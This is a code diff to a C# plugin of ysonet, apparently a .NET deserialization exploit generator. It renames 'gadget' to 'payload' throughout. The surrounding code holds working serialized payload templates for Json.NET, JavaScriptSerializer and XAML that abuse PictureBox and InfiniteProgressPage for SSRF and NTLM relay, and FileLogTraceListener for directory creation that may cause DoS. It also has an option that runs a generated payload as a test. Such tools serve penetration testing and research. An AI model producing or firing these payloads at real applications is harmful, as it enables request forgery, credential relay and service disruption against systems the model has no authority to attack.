@@ -1,6 +1,6 @@
-﻿using System;
+﻿using NDesk.Options;
+using System;
 using System.Collections.Generic;
-using NDesk.Options;
 using ysonet.Helpers;
 
 namespace ysonet.Plugins
@@ -8,7 +8,7 @@ namespace ysonet.Plugins
     // Author: Piotr Bazydlo
     // Implements Non-RCE gadgets for .NET Framework.
     // Gadgets are implemented for several serializers but some of serializers are not implemented (like MessagePack)
-    // Feel free to add any gadget here or contribute with the implementations for different serializers
+    // Feel free to add any payload here or contribute with the implementations for different serializers
 
     public class NetNonRceGadgetsPlugin : IPlugin
     {
@@ -26,17 +26,17 @@ namespace ysonet.Plugins
                     if (v != null) showList = true;
                 }
             },
-            {"i|input=", "input to the gadget", v => input = v},
-            {"g|gadget=", "gadget to use", v => gadget = v},
+            {"i|input=", "input to the payload", v => input = v},
+            {"g|payload=", "payload to use", v => gadget = v},
             {"f|formatter=", "Formatter to use", v => formatter = v},
             {
-                "t", "test gadget (execute after generation)", v =>
+                "t", "test payload (execute after generation)", v =>
                 {
                     if (v != null) test = true;
                 }
             },
             {
-                "minify", "minify gadget", v =>
+                "minify", "minify payload", v =>
                 {
                     if (v != null) minify = true;
                 }
@@ -66,15 +66,15 @@ namespace ysonet.Plugins
             return @"
 Gadgets:
 
-    (*) PictureBox - SSRF / NTLM Relay gadget. Protocols that can be used: http, https, ftp, file
+    (*) PictureBox - SSRF / NTLM Relay payload. Protocols that can be used: http, https, ftp, file
         Formatters: Json.NET, JavaScriptSerializer, Xaml
         [Finders: Piotr Bazydlo]
 
-    (*) InfiniteProgressPage - SSRF / NTLM Relay gadget. Protocols that can be used: http, https, ftp, file
+    (*) InfiniteProgressPage - SSRF / NTLM Relay payload. Protocols that can be used: http, https, ftp, file
         Formatters: Json.NET, JavaScriptSerializer, Xaml
         [Finders: Piotr Bazydlo]
 
-    (*) FileLogTraceListener - directory creation gadget.May lead to DoS, when executed with admin privileges.
+    (*) FileLogTraceListener - directory creation payload.May lead to DoS, when executed with admin privileges.
         Formatters: Json.NET, JavaScriptSerializer, Xaml
         [Finders: Piotr Bazydlo]
 
@@ -88,15 +88,15 @@ Exemplary usage:
 ";
         }
 
-        //PictureBox gadget
+        //PictureBox payload
         public string PictureBox(string input, string formatter)
         {
 
-            String gadget = "";
+            String payload = "";
 
             if (formatter.ToLower() == "json.net")
             {
-                gadget = @"
+                payload = @"
 {
     '$type':'System.Windows.Forms.PictureBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
     'WaitOnLoad':'true',
@@ -105,7 +105,7 @@ Exemplary usage:
             }
             else if (formatter.ToLower() == "javascriptserializer")
             {
-                gadget = @"
+                payload = @"
 {
     '__type':'System.Windows.Forms.PictureBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
     'WaitOnLoad':'true',
@@ -114,29 +114,29 @@ Exemplary usage:
             }
             else if (formatter.ToLower() == "xaml")
             {
-                gadget = @"<PictureBox WaitOnLoad=""true"" ImageLocation=""" + input + @""" xmlns=""clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms"" xmlns:st=""clr-namespace:System.Text;assembly=mscorlib"" xmlns:assembly=""http://schemas.microsoft.com/winfx/2006/xaml"">
+                payload = @"<PictureBox WaitOnLoad=""true"" ImageLocation=""" + input + @""" xmlns=""clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms"" xmlns:st=""clr-namespace:System.Text;assembly=mscorlib"" xmlns:assembly=""http://schemas.microsoft.com/winfx/2006/xaml"">
 </PictureBox>
 ";
             }
             else
             {
-                Console.WriteLine("Formatter " + formatter + " is not implemented for the PictureBox gadget");
+                Console.WriteLine("Formatter " + formatter + " is not implemented for the PictureBox payload");
                 Environment.Exit(-1);
             }
 
 
-            return gadget;
+            return payload;
         }
 
-        //InfiniteProgressPage gadget
+        //InfiniteProgressPage payload
         public string InfiniteProgressPage(string input, string formatter)
         {
 
-            String gadget = "";
-            
+            String payload = "";
+
             if (formatter.ToLower() == "json.net")
             {
-                gadget = @"
+                payload = @"
 {
     '$type':'Microsoft.ApplicationId.Framework.InfiniteProgressPage, Microsoft.ApplicationId.Framework, Version=10.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
     'AnimatedPictureFile':'" + input + @"'
@@ -144,7 +144,7 @@ Exemplary usage:
             }
             else if (formatter.ToLower() == "javascriptserializer")
             {
-                gadget = @"
+                payload = @"
 {
     '__type':'Microsoft.ApplicationId.Framework.InfiniteProgressPage, Microsoft.ApplicationId.Framework, Version=10.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
     'AnimatedPictureFile':'" + input + @"'
@@ -152,28 +152,28 @@ Exemplary usage:
             }
             else if (formatter.ToLower() == "xaml")
             {
-                gadget = @"
+                payload = @"
 <InfiniteProgressPage AnimatedPictureFile=""" + input + @""" xmlns=""clr-namespace:Microsoft.ApplicationId.Framework;assembly=Microsoft.ApplicationId.Framework"" xmlns:st=""clr-namespace:System.Text;assembly=mscorlib"" xmlns:assembly=""http://schemas.microsoft.com/winfx/2006/xaml"">
 </InfiniteProgressPage>
 ";
             }
             else
             {
-                Console.WriteLine("Formatter " + formatter + " is not implemented for the InfiniteProgressPage gadget");
+                Console.WriteLine("Formatter " + formatter + " is not implemented for the InfiniteProgressPage payload");
                 Environment.Exit(-1);
             }
 
-            return gadget;
+            return payload;
         }
 
-        //FileLogTraceListener gadget
+        //FileLogTraceListener payload
         public string FileLogTraceListener(string input, string formatter)
         {
-            String gadget = "";
-            
+            String payload = "";
+
             if (formatter.ToLower() == "json.net")
             {
-                gadget = @"
+                payload = @"
 {
     '$type':'Microsoft.VisualBasic.Logging.FileLogTraceListener, Microsoft.VisualBasic, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a',
     'CustomLocation':'" + input + @"'
@@ -181,7 +181,7 @@ Exemplary usage:
             }
             else if (formatter.ToLower() == "javascriptserializer")
             {
-                gadget = @"
+                payload = @"
 {
     '__type':'Microsoft.VisualBasic.Logging.FileLogTraceListener, Microsoft.VisualBasic, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a',
     'CustomLocation':'" + input + @"'
@@ -189,17 +189,17 @@ Exemplary usage:
             }
             else if (formatter.ToLower() == "xaml")
             {
-                gadget = @"
+                payload = @"
 <FileLogTraceListener CustomLocation=""" + input + @""" Filter=""{assembly:Null}"" xmlns=""clr-namespace:Microsoft.VisualBasic.Logging;assembly=Microsoft.VisualBasic"" xmlns:st=""clr-namespace:System.Text;assembly=mscorlib"" xmlns:assembly=""http://schemas.microsoft.com/winfx/2006/xaml"">
 </FileLogTraceListener>";
             }
             else
             {
-                Console.WriteLine("Formatter " + formatter + " is not implemented for the FileLogTraceListener gadget");
+                Console.WriteLine("Formatter " + formatter + " is not implemented for the FileLogTraceListener payload");
                 Environment.Exit(-1);
             }
 
-            return gadget;
+            return payload;
         }
 
         public object Run(string[] args)
@@ -216,11 +216,11 @@ Exemplary usage:
             //inputs verification
             try
             {
-                if (string.IsNullOrWhiteSpace(gadget)) throw new ArgumentException("A gadget name must be provided.");
+                if (string.IsNullOrWhiteSpace(gadget)) throw new ArgumentException("A payload name must be provided.");
 
                 if (string.IsNullOrWhiteSpace(formatter)) throw new ArgumentException("A formatter name must be provided.");
 
-                if (string.IsNullOrWhiteSpace(input)) throw new ArgumentException("An input to the gadget must be provided.");
+                if (string.IsNullOrWhiteSpace(input)) throw new ArgumentException("An input to the payload must be provided.");
             }
             catch (Exception e)
             {
